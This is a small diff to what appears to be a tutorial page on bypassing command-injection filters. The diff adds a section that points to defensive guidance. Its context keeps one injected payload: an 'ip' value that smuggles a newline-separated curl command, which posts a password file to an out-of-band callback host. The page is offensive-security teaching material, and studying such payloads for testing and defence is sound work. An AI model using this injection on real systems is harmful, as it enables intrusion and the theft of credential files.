@@ -16,5 +16,6 @@ leading to:
 ip=127.0.0.1+%0A+curl+-X+POST+--data+"@.passwd"+jobc0c724o9snp1oq21rh50ex53wrnfc.oastify.com
 ```
 
+## Counter moves
 
-
+Command injection: filter bypass is what this page works through. Server-side validation and least privilege are what these reduce to. The defender's view is in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
